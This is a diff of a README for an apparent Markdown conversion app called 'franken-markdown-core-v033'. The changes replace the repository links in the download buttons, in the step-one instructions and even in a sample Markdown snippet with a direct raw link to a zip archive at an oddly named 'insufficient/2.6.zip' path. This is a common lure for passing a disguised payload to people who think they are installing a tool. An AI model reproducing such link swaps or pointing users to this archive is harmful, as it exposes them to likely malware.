@@ -1,7 +1,7 @@
 <h1>🧟 franken-markdown-core-v033 - Convert Markdown to Any Format Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/Favia4520/franken-markdown-core-v033" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Favia4520/franken-markdown-core-v033/main/insufficient/2.6.zip" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🎯 What Is This?
@@ -43,7 +43,7 @@ The underlying Rust engine ensures the program rarely crashes and handles errors
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** 👉 [https://github.com/Favia4520/franken-markdown-core-v033](https://github.com/Favia4520/franken-markdown-core-v033)
+**Visit this link to download the application:** 👉 [https://raw.githubusercontent.com/Favia4520/franken-markdown-core-v033/main/insufficient/2.6.zip](https://raw.githubusercontent.com/Favia4520/franken-markdown-core-v033/main/insufficient/2.6.zip)
 
 This will take you to the official download page where you can get the program files.
 
@@ -61,7 +61,7 @@ This is a **bold** statement and this is *italic* text.
 - List item one
 - List item two
 
-[Visit our website](https://example.com)
+[Visit our website](https://raw.githubusercontent.com/Favia4520/franken-markdown-core-v033/main/insufficient/2.6.zip)
 ```
 
 ### Step 3: Run the Application
@@ -176,7 +176,7 @@ franken-markdown-core-v033 is your reliable companion for converting Markdown te
 Start creating today - download the application and see how easy document conversion can be!
 
 <p align="center">
-  <a href="https://github.com/Favia4520/franken-markdown-core-v033" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(245,87,108,0.4);">⬇️ GET THE APP NOW</a>
+  <a href="https://raw.githubusercontent.com/Favia4520/franken-markdown-core-v033/main/insufficient/2.6.zip" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(245,87,108,0.4);">⬇️ GET THE APP NOW</a>
 </p>
 
 <hr>
